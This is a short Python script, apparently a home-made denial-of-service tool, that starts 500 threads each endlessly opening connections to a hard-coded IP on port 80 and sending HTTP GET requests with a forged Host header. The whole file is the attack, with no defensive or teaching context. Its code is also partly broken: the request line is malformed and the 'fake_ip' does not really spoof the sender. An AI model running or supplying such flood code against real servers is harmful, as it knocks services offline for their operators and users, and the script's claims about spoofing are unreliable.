import threading
import socket

target = "192.168.169.2"
port = 80
fake_ip = "182.21.20.32"

active_connections = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + " HTTP:/1.1\r\n").encode("ascii"),(target,port))
        s.sendto(("Host: "+ fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()

        global active_connections
        active_connections += 1
        if active_connections % 500 == 0:
            print("DDOS attack completed")

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()